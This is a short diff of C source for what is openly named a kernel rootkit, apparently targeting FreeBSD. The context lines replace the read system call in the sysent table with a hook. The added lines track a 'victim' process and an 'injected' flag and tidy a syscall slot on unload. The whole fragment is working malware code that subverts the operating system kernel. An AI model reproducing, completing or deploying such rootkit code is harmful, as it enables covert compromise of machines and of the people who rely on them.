@@ -214,6 +214,11 @@ initializeRootkit (void) {
   // Intercept the read system call
   oldRead = sysent[SYS_read].sy_call;
   sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
+
+  // Mark that we have no active victim
+  victimProc = 0;
+  injected = 0;
+  return;
 }
 
 static void
@@ -223,6 +228,8 @@ unloadRootkit (void) {
   //
   sysent[SYS_read].sy_call = (sy_call_t *) oldRead;
   sysent[11].sy_call = (sy_call_t *) nosys;
+  sysent[11].sy_narg = 0;
+  sysent[11].sy_thrcnt = SY_THR_ABSENT;
 }
 
 //
